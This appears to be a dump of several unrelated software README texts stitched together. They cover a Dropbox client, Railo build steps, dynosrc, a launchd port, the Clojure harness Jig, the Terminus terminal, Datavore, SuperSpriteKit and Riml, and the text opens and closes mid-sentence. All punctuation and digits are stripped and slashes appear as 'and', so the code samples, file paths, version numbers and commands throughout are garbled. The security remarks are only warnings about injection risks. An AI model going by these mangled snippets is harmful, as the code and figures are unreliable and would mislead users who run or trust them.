retrieves a file specified by the path callback will be called with a possible error and the buffer of the contents of the file this method also returns a readable stream that can be used to pipe the contents dropboxclient mybigfile mpeg pipe fs createwritestream localbigfile mpeg and and download the first  byte dropboxclient file zip  range bytes    function err data console log data length and and  that is if the file is at least  bytes uploads a file specified by filepath to remotepath on dropbox dropbox currently does not support streaming uploads and the max upload is  mb optargs can also take additional fields overwrite and parentrev similar to putfile but places contents into a created file at remotepath contents can be a buffer or string gets metadata of file and folder specified by path optargs can have fields hash  list  includedeleted and rev keeps up with changes from a client s dropbox changes is an array of arrays with first element as the path and second as metadata convenient method that provides a more friendly api to delta returns an event emitter that emits data events with path and metadata parameters on changes to the client s dropbox also can emit reset and error events the returned event emitter also has a pause and resume methods searches folderpath for files matching query results is an array of metadata optargs can take filelimit and includedeleted downloads a thumbnail image located at filepath like getfile  the callback can get buffered data or the returned readable stream can be piped optargs can take format and size fields creates and gets a link to file and folder specified by path creates and gets a direct link to file specified by filepath copies a file fromcopyref field can be given in optargs to use it instead of frompath creates a folder at the given path deletes file or folder from path moves a file to another path run

726492, railo cfml engine  welcome to the railo cfml engine source code repository building from source  before you can start building railo from source you will need a few things installed on your machine if you are familiar with eclipse and git we recommend using these tools as well the repository contains a few branches with the most important ones being master current release and develop alpha and beta releases if you are familiar with git then by all means clone the repository and grab all the branches at once if you are not comfortable working with git an easier way to grab the source code of a given branch is by downloading a zipball if you require other branches simply change the branch you re on from the drop down above and then click the button labeled zip extract the contents of the zip archive into a work directory e g and railo source inside that work directory you will now have the folders and railo cfml and and railo java and a few other files including this one a portion of the railo code is written in cfml so you will need a running instance of railo on your local machine in order to compile it in a sense we are using railo to build railo how meta is that the root of that server should point to the and railo cfml folder in the source code that you downloaded if you are using railo express you can set that as follow  edit railo express and contexts and railo xml and modify the resourcebase element so that it points to the and railo cfml folder e g tip later versions of railo express may have a www xml file instead of a railo xml file rename the file from www xml to railo xml and modify the resourcebase element as indicated above  start the railo express instance by running railo express and start or railo express and start bat tip if you are using the railo express version the default port number is  tip set the server administrator password as well as the web administrator password note the url of that railo instance you will need it in the next step the build process will connect to the local instance of railo in order to compile some of the code you need to edit and railo java and railo core and build properties and let the build script know where to find the local railo instance the build process will generate a patch file that you can deploy as an update to railo servers in order for the patch to work its version must be higher than the current version on the server that you wish to patch you should set the version in and railo java and railo core and src and railo and runtime and info ini at the time of this writing the content of that file is version number     level os state alpha name endal release date  and  and     cet simply edit the value of the number property so that it is higher than the version on the server that you plan to patch for example     open a command prompt or shell and change the working directory to and railo java and railo master and run ant by simply typing when prompted enter the admin password that you ve set in step  tip ant s path must be in the system s executables path the build process should take a minute or two once it s finished you can find the newly built patch file in and railo java and railo core and dist and the filename will be the version number that you ve set in step  with the extension rc for example     rc

14286653, dynosrc is a general solution for efficiently delivering js resources to clients using diff based updates as assets change over time dynosrc loads javascript files inline in your html response then stores them in localstorage you can even inline the calls to the dynosrc client lib in your html response eliminating all http requests for javascript on your site normally if a js asset on your site changes your users will have to download the entire file again even though just a fraction of it changed dynosrc sends down differentials updates so changes to large files don t require full downloads npm install dynosrc dynsrc globals and and folder containing your js and css files assetsdir dirname and and assets and and install express style middleware app use dynosrc middleware dynsrc assets and and point directly to files on github ryanstevens and modelflow filename package json  source git  and and this can also be a tag head f jquery head     and and this lives on disk source asset app get and  function req res dynsrc getpatches req patches jquery  backbone  function err patches res render index html  title super cool project  patches patches   and and inserted from dynsrc getpatches dynosrc apply my cool module      diff git diff we are relying on forking out to a childprocess this means the process you are running node with must have access to git the reason we are not using js git for this was because that feature was not implemented yet dev mode ftw dynosrc eats its own dog food in while developing we really felt this was an important feature so this isn t just a build tool for production this way any bugs that come from using this strategy will appear earlier in the dev cycle rather than in production here is a simple run down of what the middleware will do on every page load look at the resources in your cookie look at every local resource in your repo that needs to be served determine if there were changes due to direct file change via a human or maybe grunt rewrote them write the changed file to a scratch area with an epoc timestamp compute a diff from the last page load send only the diff dev mode will eat your entire hd someone needs to write a thing to clean up all the things move sever oriented unit tests out of nodeknockout repo and into public dynosrc repo remove hard dependancy on shelling out to git much of this feels like it could be complimented with a grunt task write client unit tests against dynosrc js bit mask resources in cookie to not store entire resource name

scrubbed cleaner scrubbers scrubbers scrub i m not that dirty scrubbers should always be passed as an array and will be run in the order that you specify any single argument string manipulation function can be used to reference a class simply convert the studlycase to snakecase in the example above removeweirdcharacters refers to a fictional class named removeweirdcharacters to save some typing you can set scrubbers to run every time before and after each cleaning cleaner pre trim cleaner post htmlentities and and trim will run before each of these htmlentities after each cleaner

57220, mac os x   tiger introduced a new program called launchd the daemon replaced systemstarter macos legacy and older rc d bsd legacy startup processes and job management functionality launchd can be split into two logical pieces process   i e the root launchd which controls system startup and system daemons and user launchd which allows invividual users to manage their own processes and jobs the primary goal of this project is to port launchd in its entirety over to freebsd hopefully making it usable by other bsd or linux systems along the way that said the primary motivator for the original porting work in  was to improve boot time while improved boot time would be of tangible benefit to freebsd users the current motivator of this project is to enable modern process management for user and system level processes on freebsd systems discussion can occur useful for cross referencing apple system headers and code with freebsd system headers and code

12214217, a jig console and resources and assets and mainright angle jig jpg jig is an application harness providing a beautifully interactive development experience for clojure projects feedback is at the heart of all agile software development processes if you can reduce the time between making a change and seeing the result you can proceed faster with more confidence and accuracy for the majority of developers the impact of changing code cannot be determined until the entire system has been re built and re tested while there are many advantages to frequent and thorough testing for developers the wait is long enough for us to lose our concentration and focus unless you have experienced a development environment that offers instant feedback upon change it is difficult to describe the impact it can have on your ability to solve difficult problems produce reliable code quickly and make programming more enjoyable clojure in the tradition of dynamic languages comes very close to providing this kind of experience right out of the box in lisp functions are bound to vars which can be rebound and when functions are applied the latest binding of the function is used in practice however there are some minor quirks that impair the dependability of the code reloading adding a new library dependency redeclaring a defmulti or clojure protocol stale state referenced in def s and defonce s are some examples one of jig s aims is to handle these incidentals for you letting you concentrate more fully on your programming jig builds upon stuart sierra s excellent pattern therefore it s important that you re familiar with the general idea of this pattern the developer invokes a reset function at various intervals which causes a minimalist reloading of just the code that has changed since the last reset and anything else that needs reloading as a result due to the intricacies of clojure and the jvm this is a non trivial problem that stuart has solved typically the reset function is bound to a hotkey emacs keybinding i use c c r or price of entry is that a developer has to ensure all application state is held in a single map or record called the system otherwise the pattern doesn t work but in practice this is a good architectural policy to establish regardless jig extends stuart s work by providing some optional extra features that can help in the development of large clojure systems modularity through componentisation configuration support for multiple projects a growing set of common re usable infrastructure components stuart describes the system constructor which creates the initial state of a system jig provides an implementation of the system constructor that delegates the job of creating the system to components each component having the same lifecycle interface as stuart describes init  start and stop the system is created by threading it through all the components a reset stops and restarts all components components are initialized and started in dependency order and stopped in reverse dependency order allowing for a clean shutdown of resources there are many good reasons for dividing your system into separate components one is that it gives you looser coupling between your components which can make it easier to re use them among other benefits another is that it allows you flexibility and architectural options at deploy time for example you can deploy all your components in a single jvm for a test environment while in production you could distribute components across multiple jvms for scaleability if you are forced to deploy lots of small jvms in all environments this can be an inefficient use of precious memory i prefer to run a smaller number of jvms each with more memory developing clojure applications as monolithic systems works well to begin with but can reduce flexibility down the road i want the option of deploying early versions of new projects quickly without the hassle of setting up a new server or incurring the cost of a dedicated jvm mb is not an insignificant overhead when you have dozens of clojure based web applications jig lets me quickly hook up new web applications and services onto an existing clojure deployment here s an example of one of my component graphs example component dependency graph console and resources and assets and example graph png rather than using a lein template to generate the project and the corresponding dev system jig separates these concerns you can use jig s workflow to develop on existing projects that don t have a built in dev workflow you can also fork and improve jig to your own requirements the aim is to retain to your development tooling one jig project can be used against many different projects even simultaneously see components i wrote jig because i wanted to create new clojure projects quickly without having to maintain the development harness for each one as i make a small improvement to one development harness i don t want the hassle of going through all my other projects to update them in the same way but neither do i want dozens of development harnesses that differ from each other i want one development harness re usable jig that i can use against multiple leiningen based projects  jig lets you specify configuration for your components in a single configuration file however components can source their own configuration if desired jig does not have opinions as to how you should build your applications however if does provide good support for writing jig in your deployment more details can be found below pedestal boasts bidirectional routes so that uris can be generated from route definitions rather than determined some other way jig provides a url for function in the pedestal context and defaults the app name and request to make it easy to generate paths that make sense in the context of the page on which the link is placed it can be cost effective for multiple web applications to share the same jvm jig allows you to host web applications under contextual uri prefixes this is a feature made possible by the provision of the url for function since portable web applications can use this to generate uris for web links in their content without resorting to hard coding uri paths errors thrown from components that fail during initialization or start up do not cause the entire system to fail this reduces the number of times that you have to reboot the jvm only components that are successfully initialized are started and only those that are successfully started are stopped any failures are indicated in the repl with full details and stack traces written to the log file normally you ll be used to creating with a project with lein new  cd ing to the newly created directory perhaps adding some plugins to its project clj file and running lein working with jig is different in that you run lein from the jig project directory and point the configuration at one or more of your existing leiningen projects clone the jig repository as you would any other clojure project configure jig by copying in a config file into the config and config edn you can skip this step if you want to see jig running in its default configuration which includes examples if you re using emacs load up jig s project clj and m x nrepl jack in that s usually bound to control c meta j in the nrepl buffer that eventually appears type user go alternatively on the command line type lein repl user go sync the application by calling reset user reset resetting the application will cause namespaces to reload thanks to stuart s work in org clojure and tools namespace such that the application will be back in sync with the code base this is the feature that makes development fast and interactive and it s all thanks to stuart s hard work you should find yourself typing reset rather a lot and soon even that becomes burdensome here s some emacs code you can paste into your home and emacs d and init el to provide a shortcut clojure defun nrepl reset interactive save some buffers set buffer nrepl goto char point max insert user and reset nrepl return global set key kbd c c r nrepl reset clojure defun cider repl reset interactive save some buffers with current buffer cider current repl buffer goto char point max insert user and reset cider repl return global set key kbd c c r cider repl reset after re evaluating or restarting emacs you ll be able to reset the application using control c r a configuration specifies which components you want to include in your system where to find these components the leiningen project and the configuration settings they will get usually you ve have one configuration file per project per environment e g dev uat prod by default jig looks for a config and config edn file but you can override this by placing a config file in home and jig and config edn where home is your home directory if a configuration file can t be found a default will be used a configuration is a map which usually contains a jig and components key listing the components in a map each key in the map is the component s label you can get a good idea of the format by looking at the config and default edn file it s also possible to link to other configuration files which are merged into a single config clojure jig and include and home and malcolm and src and octopus and config clj and home and malcolm and src and juxtweb and config clj while edn files are preferred you can use clj if you want to evaluate clojure expressions such as calculations important to avoid injection attacks never use the clj suffix for configuration you don t entirely control including user submitted configuration a very useful trick is to use clojure s reader macro in the home and jig and config clj you can t use an edn file for this trick a useful pattern is to load in the default configuration and make tweaks to it for the environment you re running jig in this helps to prevent a proliferation of diveraging configuration files which is a common problem with multiple environments in any configuration system each configuration can inherit from the defaults and use a clojure program to derive a modified version what better language than clojure to tweak a map here s an example clojure start with the original configuration stored in the git repo clojure core and read string slurp str system and getproperty user home and src and my proj and config clj add a private component assoc in jig and components firefox reloader jig and component jig web firefox reload and component jig and dependencies service cljs server jig web firefox reload and host localhost jig web firefox reload and port   oh dear some tricky path munging we have to change lots of paths let s walk the tree due to symlinks not working well on dropbox mounts replace all instances of relative paths with absolute ones partial clojure walk and postwalk fn x if let path and string x second re matches and my proj x str and home and malcolm and another path and src and my proj path x you can write your own components by defining a type or record at the very least it needs to implement the jig lifecycle protocol clojure ns org example core import jig lifecycle deftype component config lifecycle init  system system start  system system stop  system system in stuart s reloaded workflow the init function is responsible for creating the system in jig s component model the system map is threaded through each component s init function giving it a chance to add stuff likewise for the start and stop functions the minimum you need to do is return the original system for the next component in the chain once you have declared your component you need to reference it in the config file config and config edn jig needs to know which components you want activated if this file doesn t already exist copy over the contents from config and sample config edn if you need to evaluate clojure expressions in your config use a clj suffix e g config and config clj for example clojure jig and components hello app jig and component org example core and component components will be instantiated with a single argument the component s configuration value as specified in the config file so if you want to pass configuration to your component an easy option is to add it to the component s entry in the config and config edn file if you want to see the state of the system at any time it s available from the repl user system it s nicer if you have pretty printing enabled at the repl m x cust var ret nrepl use pretty printing alternatively you can be explicit user pprint system sometimes a component will rely on the existence of another dependencies can be specified in the component configuration under the jig and dependencies key where the value is a vector of keys to other components in the configuration for example let s suppose component y is dependent on component x clojure jig and components x jig and component org example core and x y jig and component org example core and y jig and dependencies x you can also view the component dependency graph from the repl user graph component dependency between x and y console and resources and assets and component dependencies png there are some situations where you want state to survive across resets values that are stored in the system anywhere under the jig and safe branch will not be purged in the vast majority of cases you should prefer state to be reinitialised on a reset jig comes with its own components providing useful functionality and demonstrate how components are written each component is configurable if you need a component which isn t in this list i am happy to provide it provides a jetty service that can be used by ring applications amalgamates compojure routes contributed by other components into a single handler pulls the latest code from a remote git repository this can be useful as part of an automatic continuous delivery mechanism provides a reload capability invokable as a jmx operation purges an nginx reverse proxy to ensure cached pages do not survive a system reset provides an nrepl server useful if the system isn t started with lein repl but an nrepl service is still desired a trigger to get firefox to reload the current page upon every rest requires the installed and enabled the icon should be green provides a pedestal service on a tomcat or jetty listener and ensures that the system is made available to each pedestal handler this unifies stuart s approach with the pedestal framework allowing you to enjoy stuart s rapid development workflow while writing pedestal services one of the major benefits of pedestal over ring is the support for bi directionality between routes and handlers for me this is a stand out feature because of the importance of hyperlinks both in web pages and restful web applications asking the library to generate urls for you rather than hard coding them in your application reduces the risk of broken links and maintenance cost jig injects a useful function into the pedestal context under the url for key that lets you generate urls relative to request you are processing by default urls are generated to handler within the same application but you can specify app name to target other applications hosted in the same jvm look at the use of url for in the example below see how easy it is to generate urls to target other pedestal handlers nice clojure defhandler my index page request status  headers content type text and plain body hello world defbefore my root page keys url for as context assoc context response ring util response and redirect look no nasty hard coded urls url for my index page provides a web application abstraction on top of jig web server and component other components can add pedestal routes to a web application component these are then combined to form a complete pedestal route table applications can share the same jig web server and component  allowing for virtual hosts applications can specify a different host scheme or be rooted at a sub context this are really useful for hosting different clojure powered websites on the same jvm these examples assume a little knowledge about pedestal see adding a step to compile clojurescript on every reset can be accomplished with this component clojure cljs builder jig and component jig cljs and builder jig and project and myproj and project clj output dir and myproj and target and js output to and myproj and target and js and main js source map and myproj and target and js and main js map optimizations none clean build false setting clean build to true will cause the output directory to be deleted on every reset otherwise an incremental build will be performed the compiler environment is stored under the jig and safe branch to make incremental builds possible incremental builds are a lot faster and are therefore enabled by default you may want to configure different builder components for different pages or for different optimizations multiple builds can be achieved by adding multiple instances of this component to your configuration once the javascript and source map files have been generated it is often useful to be able to serve it from a web server a minimum of two dependencies must be specified one should be a jig cljs and builder component instance the other should be the a jig web app and component component instance a web context should be specified under which resources will be available clojure cljs server jig and component jig cljs and fileserver jig and dependencies cljs builder web jig web and context and js you point jig at your own projects by specifying a jig and project configuration entry which specifies the project containing the component you wish to include clojure juxtweb and service jig and component pro juxt website core and component jig and dependencies juxtweb and web jig web and app name juxtweb and web jig and project and juxtweb and project clj leiningen dependencies that are added to a project during development are automatically can be added to the classpath so you don t have to restart the jvm if you are simply adding a dependency to a project you can run jig in production the same way as you run in development if you are using a single project which depends on jig or at least one jig extension you can uberjar your project create a main clj or other similar namespace with the following content clojure ns main gen class defn main args user and go in your project clj add the following clojure main main aot main project which deploys this way i don t see any reason why others couldn t create their own jigs a jig is a separate leiningen project after all although this project is named eponymously there can be others customized for specialist contexts either new projects or forks of this one if that happens and there s a need to share components between jigs for reasons of component portability then it will make sense to promote the lifecycle protocol and maybe others to a common library that different jigs can use if an external project depends on a third party jar which isn t on jig s own classpath then it will not have been visible to clojure when clojure core is first loaded this means that any data readers declared in and datareaders clj will not work if you use the edn and read string in these projects you cannot assume the data readers dynamic var will contain the data readers declared in the third party jar the workaround is to use the  arg form of edn and read edn and read string and supply the readers explicitly in the option for example when loading datomic data from a file you would use the following form clojure edn and read string readers db and id datomic db and id literal db and fn datomic function and construct base datomic codec and base  literal my data edn if a project has a and user clj file in one of its source directories then it will be loaded on a reset and override jig s user namespace jig will then stop working the current workaround is to ensure such a file isn t visible to jig either by renaming it or by removing the source directory containing it in the project s project clj file it is hoped that future versions of jig will avoid this issue by disabling the loading of such files by tools namespace clojure already does code reloading why do i need all this stuff clojure being a lisp allows you to reload functions at will but stuart s pattern which jig builds on extends this to state compile time macros protocols and types and records and multi methods experienced clojure developers know when to reload some namespaces and when to restart the jvm it seems better to raise the abstraction so you don t have to think about these technicalities all the time just reset each time you want consistency while you develop jig is trying to provide you with a better development experience while nudging you towards a modular architecture that will help you when your system grows to a certain size where can i find examples of projects using jig development deploying using lein uberjar what s the relationship between jig and up and has stolen all the worthy bits the main difference between up and jig is that up added config to the leiningen project and the dependency relation between projects and infrastructure has been reversed in due course jig will add a protocol that components can extend to communicate with other components over a system bus core async channel  and will then provide a superset of up s functionality jig is better don t forget the system is available in the repl as user and system that s useful for testing what functions are returning you can check what s in the system by outputting it to the console keys user and system is often useful if the system gets very large and you need to navigate it by default jig configures logback and logs are written to home and jig and logs events such as component init startup and shutdown and exceptions that occur during these phases are written to here when the repl tells you to check the log files this is where you should look you should return the system value modified if necessary from each component function if you don t return any value jig will detect this and throw an error make sure that you do modify the system but then return using the symbol representing the unmodified system that s a common mistake jig won t detect that you have returned the same system it gave you because that s normal behaviour java lang illegalargumentexception no implementation of method init of protocol jig and lifecycle found for class ensure you require jig before import ing the jig and lifecycle protocol currently this supports the following limited functionality this readme a system map browser a list of todos triggering a reload security advisory since this

3338650, note even though the project might seem dead i do use this terminal it just happens to be good enough for my purposes so i don t bother updating it if you have trouble making it work have suggestions or want to contribute anything please do tell me about terminus vt emulator and inline html  terminus is a terminal emulator with the ability to create and manipulate inline html cells in addition to plain text in its current state it can already serve as an xterm replacement bar some escape codes that are not yet supported for the most part terminus plays nice with existing unix utilities i have organized most of its capabilities in a line based approach so notwithstanding one or two gotchas they play nice with command line utilities such as grep or sed since it s all based on escape codes the enhanced display options also work through ssh terminus requires node and its package manager npm  to be installed cd path and to and terminus cd server npm install node terminus server js server yaml you can also go to and debug or and python instead of and bash read the server yaml file if you don t want to mess with an existing more recent version of node you can install node    in some isolated place with configure prefix and local  or you can omit make install and run and path and to and node and out and release and node there s also a python server but it s pretty bad compared to the node one plus i broke it you can go back in time on the repo feb  ish if you want to try that important client and server communication is not encrypted at all for the time being integrating ssl should be easy enough only run terminus locally and don t run it on a shared machine important using escape codes programs can do arbitrary javascript injection and this includes simulating keyboard strokes and typing commands on your shell because of this it is technically possible for serious wreckage to occur with a mere cat of a malicious file anybody who can tell me how to properly sandbox javascript within javascript to avoid this gets a cookie terminus is used much like a normal xterm you can run commands like top emacs vi ipython or ssh without many problems not all escape codes are handled yet and there might be some slight bugs in those that are so commands like reset and screen are iffy and for some reason ipython seems to show the wrong colors you can paste with ctrl and v or the mouse wheel you can start exploring with the applications that are in bin and so far they are dr  show  tcmd  box and xkcd you will have to add them to your path in order to execute them unqualified i have taken screenshots of myself using each of the commands i think they speak for themselves note the tb example doesn t work like that anymore you now have to use t as a separator instead of a space the terminus server gives access to the filesystem in and f and user host and path and from and root  so you can link to files or images on the filesystem that way so you see it s really easy since it works with escape codes on stdout you can take advantage of the features in any language without any special libraries and it works through plain ssh as well except obviously for the fact that the remote filesystem is not mounted by default but you can do it with sshfs and config useful shortcuts  shift space letter same as control letter  but since most browsers don t allow catching some shortcuts e g control w this is the only way to send some control codes i might change that binding because it s too easy to accidentally hit shift space right after a shifted characted control shift b drop all unprocessed characters in the queue this is handy if a program prints data faster than terminus can handle it control shift c space clear elements that are absolutely positioned at the top left right and bottom of the terminal screen if they are control shift d shortcut bypasses terminus s key bindings and uses the browser s default bindings instead for instance c s d c l will focus the url bar control shift l clear all lines in the scrollback f refresh the page this does not terminate your session and will solve most problems at the expense of losing the screen s contents and the scrollback the list of key bindings can be found documentation  configuration  see server and server yaml and resources and settings and default yaml the options are extensive including nearly total customization of key bindings  and documented if you change default yaml you can just refresh the page to see the changes you won t lose your session it will connect right back to it

3702897, datavore is a small in browser database engine written in javascript datavore enables you to perform fast aggregation queries within web based analytics or visualization applications datavore consists of an in memory column oriented database implemented using standard javascript arrays the system provides support for filtering and group by aggregation queries when run within an optimized javascript environment datavore can complete queries over million element data tables at interactive sub ms rates simply reference the script dv js within your web page to import datavore the included example files include demonstrations of datavore s functionality along with performance benchmarks the profile example shows how datavore can be used to support high performance brushing and linking among a datavore table is simply a collection of data columns each realized as a javascript array to create a table instance you can either initialize the full table through the constructor or add columns one by one for instance var cola a  a  b  b  c var colb  and and create a table in one call by bundling up columns var tab dv table name a  values cola type dv type nominal  name b  values colb type dv type numeric and and create a table adding one column at a time and and the resulting tab should be identical to tab var tab dv table tab addcolumn a  cola dv type nominal tab addcolumn b  colb dv type numeric in addition to the column name and array of values each column must have a specified data type one of dv type nominal  dv type ordinal  dv type numeric  or dv type unknown numeric means the column contains numbers that can be aggregated e g  summed averaged etc nominal values are category labels without a meaningful sort order while ordinal values can be meaningfully sorted datavore treats nominal and ordinal data in a special way it recodes the input array values as zero based integers much like a in the input array are sorted and placed into a lookup table mapping strings and other data types to integer codes enables faster query performance you can access values within a datavore table directly via array indices or through the table get method for nominal or ordinal types direct access will return coded integers the get method always returns the original value and and both array indices and the get method use column row ordering alert tab   and and st column nd row coded prints  alert tab get  and and st column nd row uncoded prints a and and directly accessing the lookup table lut to decode a value and and included for demo purposes only use the get method instead and and st column nd row uncoded prints a alert tab  lut tab   you can either access columns by their numerical index as above or by name and and accessing table values by column name alert tab a  and and st column nd row coded prints  alert tab get a  and and st column nd row uncoded prints a warning datavore column names should not be numbers if you use column names that javascript can interpret as integer values  you will likely experience unexpected and undesirable behavior datavore tables support two kinds of queries filtering operations and group by aggregation filtering queries simply filter table contents according to a predicate function these are similar to simple sql queries with a where clause the filtering function takes a table instance and row number as arguments and returns a new datavore table instance and and creates a new table with  rows b  b  c   var filteredtable tab where function table row return table get b  row  note to ensure that tables created by various filtering queries are compatible with each other nominal and ordinal columns within the result tables will always have the same lookup table as the original table even if some unique values have been completely filtered out as a result you may see some unexpected zero values returned when running dense aggregation queries on filtered tables the primary use case for datavore is running aggregation queries these queries allow you to calculate counts sums averages standard deviations and minimum or maximum values for a column optionally grouped according to nominal or ordinal dimensions these queries are similar to sql queries with group by clauses and and count all rows in the table returns  var counts tab query vals dv count and and count rows and sum values in nd column grouped by st column and and returns a  b  c     var groups tab query dims   vals dv count  dv sum  and and same as before but now with extra parameter code true and and nominal and ordinal types remain coded integers not original values and and returns      var uncode tab query dims   vals dv count  dv sum   code true and and count all table rows where first column a and and returns a  b  c   var filter tab query dims   vals dv count  where function table row return table get a row a the return value of the query method is an array of arrays note that the return value is not a datavore table object the input to the query method should be a javascript object with up to four parameters vals required  dims  where  and code the vals parameter indicates the aggregation functions to run the available operators are dv count  dv sum  dv min  dv max  dv avg  dv variance  and dv stdev all aggregation operators accept a single column index or name as input except for dv count  which ignores any input the dims parameter indicates the dimensions to group by this should be an array containing column indices column names or special dimension query operators dv bin or dv quantile the where parameter specifies a predicate function for filtering the table as in where queries filtering is performed prior to aggregation if true the code parameter indicates that nominal and ordinal values should be left as coded integers if false the default  coded integers are mapped back to the original values in the query result arrays the standard aggregate query uses a dense representation of the resulting data space what this means is that all dimensions are realized even if the resulting aggregate values are zero so if you group by columns a and b and column a has  unique values and column b has  unique values then the resulting aggregate table will have    rows including zero values datavore also supports a sparse representation that does not include rows for zero values to use a sparse representation use the sparsequery function like so and and non zero counts of all table rows where first column a and and returns b  c   var sparse tab sparsequery dims   vals dv count  where function table row return table get a row a so why the different query types dense queries can be calculated faster ndash by materializing the full dimensionality of the aggregated data one can use an array to store all the intermediate results the sparse representation instead uses an associative array a javascript object instance  which induces a higher overhead for object value lookups on the other hand dense queries over high dimensional data can produce very large result arrays sometimes these can be too large to fit in the browser s memory footprint so if you are dealing with high dimensional aggregates concretely if the product of the set sizes of your group by dimensions is  rows you should consider using sparsequery however if the total number of aggregate rows is reasonable as is typically the case  or you want to explicitly include zero valued cells use the normal query method for faster performance note dense queries are processed by the densequery function the query function is simply an alias for densequery datavore can be extended with new dimensional and with some effort aggregate operators to create your own dimensional operator view the source code for dv bin and dv quantile  and follow their example adding new aggregate operators is possible but more complex you will need to add a new module following in the foot steps of dv sum  dv avg  etc and add new logic to the inner loop of the query processor for both dense and sparse queries this is not for the faint of heart the query processor avoids making function calls within its inner loop mdash this helps make datavore much faster but at some cost to extensibility you will have to modify the guts of the engine to add new aggregate operators

16465720, superspritekit  the name is more of a homage to retro games than a claim that this is better than the original spritekit  while spritekit is incredibly awesome it doesn t contain all the classes or functionality that many games will need nor should it this collection of categories classes attempts to fill some of those needs most of superspritekit s components can be used as is but some have dependencies on some of its siblings all dependencies are clearly listed in the documentation and always imported in the header files for clearity a node that allows you to tile a texture across a size the default skspritenode only allows for stretching of a texture but in some cases backgrounds etc tiling is very useful a node that allows you to gracefully stretch a texture across a size using edge insets this node works pretty much like uiimage s resizableimagewithcapinsets  and is very useful for dynamically sized ui components and allows you to use a smaller texture asset for game objects that have textures with large parts that should just be repeated a label node that can render multiple lines of text it provides a simple api for creating instances using a max width and a set number of lines if desired it also supports setting styles like font font size and text color a button node that makes it really easy to create in game button type controls its api mimics parts of ns and uibutton s api with support for background textures background colors titles icons etc for various states it also supports a set of different selection styles to enable creation of different type of controls a class dedicated to input in a platform agnostic manner by using this interaction handler a lot of platform specific and and or boilerplate input code can be removed from scenes and nodes throught the game at the moment the supported interactions are touch mouse click events mouse move events keyboard events but more is coming soon a category on skspritenode that enables easy animation without having to create new actions it also provides a utility function for generating an array of sktexture instances from a texture atlas a category on sknode that adds support for tags to sknode instances these tags works similarly to how uiview and nsview s tag api works but also provides some additional methods for getting all nodes at a point that has a certain tag or performing a recursive search for all nodes that has a certain tag this is just the beginning i would love to get pull requests if you have created a generic spritekit extension that you would like to be included

sensitive string comparison default parameters in functions and other things programmers tend to take for granted to see how riml is compiled to viml just take a look at this readme the left side is riml and the right side is the viml after compilation variables  count  let s count  while count  while s count  source other vim source other vim count and  let s count and  end endwhile if you don t specify a scope modifier or namespace in vimspeak  it s script local s by default in the global scope within a function variables without scope modifiers are plain old local variables a  let s a  def examplefunc msg function s examplefunc msg a  let a  echo msg echo a msg end endfunction for i in expr for i in s expr echo i echo i end endfor notice that within a function it s unnecessary to prefix argument variables with a this is of course unless we shadow the argument variable by creating our own local variable called msg in that case we d have to refer to the argument variable as a msg explicitly shadowing variables in riml is considered bad practice as it s much easier to just come up with unique variable names across a scope let a b c  let s c  let s b s c let s a s b the let is optional in riml for all assignments without it the results are the same a  b  let s a  let s b  unless callcount if exists s callcount callcount  let s callcount  end endif callcount and  let s callcount and  echo called callcount times echo called s callcount times notice in the last line of riml there s string interpolation this works in double quoted strings and heredocs which we ll encounter later in riml you can choose to end any block with end  or with whatever you used to do in viml endif  endfunction  etc also if and unless can now be used as statement modifiers callcount  unless callcount callcount and  echo called callcount times here the compiled output is the same as the previous example s both if and unless can be used this way a true let s a  b false let s b  operators and case sensitivity  if hi greeting if hi s greeting echo greeting echo s greeting end end comparisons compile to case sensitive by default to get case insensitive comparisons you have to explicitly use the form ending in ex the only operators that don t add a even though the forms exist are the is and isnot operators this is because is is much different from its cousin is  and the same is true of isnot oh no not another of those operators well this one is pretty sweet actually in viml automatic type conversion can be a pain for example echo   to mitigate this we can wrap each side in a list since lists are more strict regarding equality echo   the operator wraps both operands in lists echo   echo   msg eos let s msg a vim heredoc s cryforjoy nhooray a vim heredoc cryforjoy hooray riml heredocs must have the ending pattern eos in this case but can be anything start at the beginning of the line interpolated expressions are allowed in heredocs functions  def fillsearchpat function s fillsearchpat and getsearchpat let and s getsearchpat return and return and end endfunction functions are by default prepended by s unless explicitly prepended with a different scope modifier of course you can use the old form function name for defining functions if you want as riml aims to be as compatible as possible with viml there are a few exceptions where riml and viml aren t compatible and these differences are explained in the section incompatibilities with viml when defining a function with no parameters and no keywords such as dict or abort  the parens after the function name are optional def fillsearchpat pat getdefaultsearchpat function s fillsearchpat and pat let splatvarcpy a  return and if empty splatvarcpy end let pat remove splatvarcpy  else let pat s getdefaultsearchpat endif and pat return and endfunction default parameters must be the last parameters given to a function but there can be more than one default parameter also a splat parameter or argname can come after default parameters splats parameters and splat arguments will be explained in the next section we can now call the function fillsearchpat without any arguments and it will use the default parameter a splat parameter is a formal parameter to a function starting with a it must be the last parameter given to a function def myecho words function s myecho echo words echo a  end endfunction myecho hello  world call myecho hello  world hello  world splat arguments are splats used in a function call context with the function myecho defined in the previous section here s an example at work words hello  world let s words hello  world echo without splat echo without splat myecho words call myecho s words echo with splat echo with splat myecho words call call myecho  s words without splat hello  world with splat hello  world the way to think about how splat arguments work is that the list variable that s splatted is broke into its constituent parts just like in ruby so myecho words is equivalent to myecho hello  world in this example notice how you can now pass the exact same arguments your function received to another function by splatting a parameter and passing it on to another function def somefunc args otherfunc args passes same arguments along to other function function s sid if exists s sidvalue return s sidvalue endif let s sidvalue matchstr expand sfile  snr zs d and zesid return s sidvalue endfunction class myclass function s myclassconstructor data otherdata def initialize data otherdata options let myclassobj self data data let myclassobj data a data self otherdata otherdata let myclassobj otherdata a otherdata self options options let myclassobj options a  end let myclassobj getdata function snr s sid s myclassgetdata let myclassobj getotherdata function snr s sid s myclassgetotherdata defm getdata return myclassobj return self data endfunction end function sid s myclassgetdata dict defm getotherdata return self data return self otherdata endfunction end end function sid s myclassgetotherdata dict return self otherdata endfunction in this basic example of a class we see a splat variable this is just a convenient way to refer to a  in the body of a function splat variables are optional parameters and get compiled to classes can only be defined once and cannot be reopened public member functions are defined with defm if you want to create a non public function inside a class use def to create an instance of this class simply obj new myclass somedata  someotherdata classes have a default scope modifier of s that is they cannot be instantiated outside the script in which they are defined in order to allow them to be instantiated in any script file you must declare the class with the explicit scope modifier of g for example class g myclass  in any one riml generated viml file there is at most  generated s sid function this generated function will be omitted in the rest of this readme for brevity but every riml file that has a class with a member function will have this code in the compiled output class translation function s translationconstructor input def initialize input let translationobj self input input let translationobj input a input end return translationobj end endfunction class frenchtoenglishtranslation translation function s frenchtoenglishtranslationconstructor input defm translate let frenchtoenglishtranslationobj if self input bonjour let translationobj s translationconstructor a input echo hello call extend frenchtoenglishtranslationobj translationobj else let 